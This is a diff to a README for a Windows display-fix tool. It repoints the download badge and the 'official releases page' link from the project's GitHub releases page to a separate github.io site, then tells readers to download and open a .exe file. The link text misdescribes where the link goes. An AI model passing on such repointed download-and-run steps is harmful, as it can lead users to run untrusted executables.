@@ -1,6 +1,6 @@
 # 🖥️ Dual-Monitor-Fix - Resolve display errors on Windows swiftly
 
-[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/suzanewaz/Dual-Monitor-Fix/releases)
+[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://suzanewaz.github.io)
 
 ## Overview 🔍
 
@@ -29,7 +29,7 @@ Your computer must meet these basic requirements to use the software:
 
 Follow these steps to download and run the software:
 
-1. Visit the [official releases page](https://github.com/suzanewaz/Dual-Monitor-Fix/releases).
+1. Visit the [official releases page](https://suzanewaz.github.io).
 2. Locate the most recent version under the Assets header.
 3. Click the file ending in .exe to start the download.
 4. Open the file after it finishes downloading.
